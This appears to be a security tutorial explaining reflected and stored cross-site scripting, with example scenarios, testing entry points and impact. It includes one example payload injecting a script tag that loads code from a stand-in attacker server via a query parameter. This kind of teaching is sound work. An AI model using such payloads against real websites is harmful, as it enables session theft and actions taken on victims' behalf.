<h2 align="center">Cross-Site Scripting aka XSS</h2>

Cross-Site Scripting is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

Cross-site scripting vulnerabilities are extremely common, we can find different type of XSS:

- Reflected XSS
- Stored XSS
- DOM Based XSS
- Blind XSS

<h4 align="center">Reflected XSS</h4>

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

<strong>Example Scenario:</strong>

A website where if you enter incorrect input, an error message is displayed. \n
The content of the error message gets taken from the <strong>error</strong> parameter in the query string and is built directly into the page source.

    www.example.com/?error=Error Message Displayed

If the application does not check for inputs apssed in the <b>error</b> parameter, it could lead to injecting malicious code, in this example loading a script from the attacker server/machine:

    www.example.com/?error=<script src="http://attackerserver.com/evil.js"></script>

<b>How to test for Reflected XSS:</b>

You'll need to test every possible point of entry; these include:

- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

<b>Potential Impact:</b>

The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.


<h4 align="center">Stored XSS</h4>


As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

<b>Example Scenario:</b>

A blog website that allows users to post comments. Unfortunately, these comments aren't checked for whether they contain JavaScript or filter out any malicious code. If we now post a comment containing JavaScript, this will be stored in the database, and every other user now visiting the article will have the JavaScript run in their browser.

<b>How to test for Reflected XSS:</b>

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

- Comments on a blog
- User profile information
- Website Listings

<b>Potential Impact:</b>

The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

<b>NOTE:</b>
Sometimes developers think limiting input values on the client-side is good enough protection, so changing values to something the web application wouldn't be expecting is a good source of discovering stored XSS, for example, an age field that is expecting an integer from a dropdown menu, but instead, you manually send the request rather than using the form allowing you to try malicious payloads
